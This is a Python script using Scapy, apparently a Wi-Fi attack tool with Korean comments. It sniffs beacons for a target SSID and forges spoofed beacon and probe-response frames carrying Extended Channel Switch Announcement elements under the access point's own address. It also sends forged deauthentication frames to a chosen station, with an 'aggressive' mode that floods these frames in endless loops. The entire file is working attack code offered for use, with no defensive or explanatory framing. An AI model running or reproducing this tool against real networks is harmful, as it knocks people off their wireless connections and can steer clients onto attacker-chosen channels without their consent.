from scapy.all import *
import time
import sys
import argparse
import re
import threading
import os
import subprocess

parser = None
mac_list = []
csa_packets = []
deauth_packets = []
conf.verb = 0

ALGO_OPEN_AUTH = 0  # OPN
START_SEQNUM = 1  # sequence number
SYSTEM_STR = "[\x1b[36m*\x1b[0m]"
WARN_STR = "[\x1b[31m!\x1b[0m]"
INFO_STR = "\x1b[33m-\x1b[0m"

def ecsa_attack(parser):
    # 채널 스위치
    channel_switch(parser)
    # Broadcast ECSA Attack
    if is_broadcast(parser):
        while not len(csa_packets):
            print("[*]Sniffing wild packets")
            sniff(iface=parser.interface, stop_filter=stop_filter_beacon, count=200)
        print("[*]Beacon ECSA Attack Start")
        send_beacon_ecsa(parser)
    # Probe Response ECSA Attack
    else:
        while not len(csa_packets):
            print("[*]Sniffing wild packets")
            sniff(iface=parser.interface, stop_filter=stop_filter_probe, count=200)
        print("[*]Probe Response ECSA Attack Start")
        t = threading.Thread(target=send_deauth)
        t.start()
        send_probe_ecsa(parser)

def is_broadcast(parser):
    return parser.casting == "broadcast"

def stop_filter_beacon(packet):
    if packet.haslayer(Dot11Beacon):
        elt = packet.getlayer(Dot11Elt)
        dot11 = packet.getlayer(Dot11)
        beacon = packet.getlayer(Dot11Beacon)
        if bytes(parser.ssid, 'utf-8') == elt.info and dot11.addr3 not in mac_list:
            print("\t" + INFO_STR + " Access Point MAC Address (BSSID) : %s" % dot11.addr3)
            mac_list.append(dot11.addr3)
            make_beacon_ecsa(parser, elt, dot11)
    return False

def make_beacon_ecsa(parser, elt, dot11):
    dot11_beacon = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=dot11.addr3, addr3=dot11.addr3)
    beacon = Dot11Beacon(cap=0o411)
    frame = RadioTap()/dot11_beacon/beacon
    ecsa_info = bytes([0, 0, 100, 1])
    ecsa = Dot11Elt(ID=0x3C, len=4, info=ecsa_info)
    flag = False

    while elt is not None:
        if elt.ID > 60 and not flag:
            flag = True
            frame = frame/ecsa
        information_element = Dot11Elt(ID=elt.ID, len=len(elt.info), info=elt.info)
        frame = frame/information_element
        elt = elt.payload.getlayer(Dot11Elt)
    csa_packets.append(frame)

def send_beacon_ecsa_t(parser, frame):
    printProgressBar()
    if parser.aggressive:
        sendp(frame, iface=parser.interface, inter=0.0004, loop=1)
    else:
        sendp(frame, iface=parser.interface, count=6)

def send_beacon_ecsa(parser):
    for frame in csa_packets:
        t = threading.Thread(target=send_beacon_ecsa_t, args=(parser, frame))
        t.start()

def stop_filter_probe(packet):
    if packet.haslayer(Dot11Beacon):
        elt = packet.getlayer(Dot11Elt)
        dot11 = packet.getlayer(Dot11)
        beacon = packet.getlayer(Dot11Beacon)
        if elt.info == bytes(parser.ssid, 'utf-8') and dot11.addr3 not in mac_list:
            print("\t" + INFO_STR + " Access Point MAC Address (BSSID) : %s" % dot11.addr3)
            mac_list.append(dot11.addr3)
            make_probe_ecsa(parser, dot11)
    return False

def make_probe_ecsa(parser, dot11):
    # addr3에 해당하는 Probe Response Frame 생성
    dot11_probe = Dot11(type=0, subtype=5, addr1=parser.sta, addr2=dot11.addr3, addr3=dot11.addr3)
    probe_resp = Dot11ProbeResp(cap=0x1111)
    essid = Dot11Elt(ID='SSID', info=parser.ssid, len=len(parser.ssid))
    ds_param = Dot11EltDSSSet(ID=0x3, len=1, channel=parser.channel)
    # ECSA 정보 요소 생성
    # 예시: 채널 스위칭 모드=0, 새로운 채널=parser.channel, 스위칭 카운트=10, 운영 클래스=81
    ecsa_info = bytes([0, parser.channel, 10, 81])
    ecsa = Dot11Elt(ID=0x3C, len=4, info=ecsa_info)
    frame = RadioTap()/dot11_probe/probe_resp/essid/ds_param/ecsa
    csa_packets.append(frame)

    # addr3에 해당하는 Deauth 패킷 생성
    dot11_deauth = Dot11(type=0, subtype=0xc, addr1=parser.sta, addr2=dot11.addr3, addr3=dot11.addr3)
    deauth = Dot11Deauth(reason=7)
    deauthFrame = RadioTap()/dot11_deauth/deauth
    deauth_packets.append(deauthFrame)

def send_probe_ecsa(parser):
    if parser.aggressive:
        while True:
            for probe in csa_packets:
                sendp(probe, iface=parser.interface, count=50, inter=0.004)
    else:
        for probe in csa_packets:
            sendp(probe, iface=parser.interface, count=6)

def send_deauth():
    if parser.aggressive:
        while True:
            for deauth in deauth_packets:
                sendp(deauth, iface=parser.interface, count=50, inter=0.004)
    else:
        for deauth in deauth_packets:
            sendp(deauth, iface=parser.interface, count=6)

def channel_switch(parser):
    print(WARN_STR + " Channel Switching : Ch." + str(parser.channel))
    os.system('iwconfig ' + parser.interface + ' channel ' + str(parser.channel))

def show_info(parser):
    print(SYSTEM_STR + " Information")
    print("\t" + INFO_STR + " SSID Information : %s" % parser.ssid)
    print("\t" + INFO_STR + " Channel : Ch.%s" % parser.channel)
    print("\t" + INFO_STR + " Interface : %s" % parser.interface)

def printProgressBar():
    print("\x1b[36m->\x1b[0m", end="", flush=True)

class PARSER:
    def __init__(self, opts):
        self.help = self.help(opts.help)
        self.interface = self.interface(opts.interface)
        self.channel = self.channel(opts.channel)
        self.ssid = opts.ssid
        self.casting = self.cast(opts.cast)
        self.aggressive = opts.aggressive

    def help(self, _help):
        if _help:
            print("HELP")
            sys.exit(0)

    def channel(self, ch):
        retval = list(range(1, 165))
        if ch:
            if ch in retval:
                return ch
            else:
                print("Invalid Channel Given.")
                sys.exit(-1)
        else:
            print("No Channel Given")
            sys.exit(-1)

    def interface(self, iface):
        def getNICnames():
            ifaces = []
            with open('/proc/net/dev', 'r') as dev:
                data = dev.read()
                for n in re.findall('[a-zA-Z0-9]+:', data):
                    ifaces.append(n.rstrip(":"))
            return ifaces

        def confirmMon(iface):
            co = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
            data = co.communicate()[0].decode()
            match = re.search(r'Mode:(\w+)', data)
            if match and "Monitor" in match.group(1):
                return True
            else:
                return False

        if iface:
            ifaces = getNICnames()
            if iface in ifaces:
                if confirmMon(iface):
                    return iface
                else:
                    print("Interface Not In Monitor Mode [%s]" % iface)
                    sys.exit(-1)
            else:
                print("Interface Not Found. [%s]" % iface)
                sys.exit(-1)
        else:
            print("Interface Not Provided. Specify an Interface!")
            sys.exit(-1)

    def cast(self, casting):
        if casting in ["unicast", "broadcast"]:
            return casting
        else:
            print("Only unicast or broadcast")
            sys.exit(-1)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help=False)

    parser.add_argument('-h', '--help', dest='help', default=False, action="store_true")

    parser.add_argument('-i', '--interface', dest='interface', default="", type=str)
    parser.add_argument('-c', '--channel', dest='channel', default=0, type=int)
    parser.add_argument('-a', '--accesspoint', dest='ap', default="", type=str)
    parser.add_argument('-s', '--station', dest='sta', default="", type=str)
    parser.add_argument('-v', '--ssid', dest='ssid', default="", type=str)

    parser.add_argument('-d', '--casting', dest='cast', default="broadcast", type=str)

    parser.add_argument('--aggressive', dest='aggressive', default=False, type=lambda x: (str(x).lower() == 'true'))

    options = parser.parse_args()
    parser = PARSER(options)
    show_info(parser)
    ecsa_attack(parser)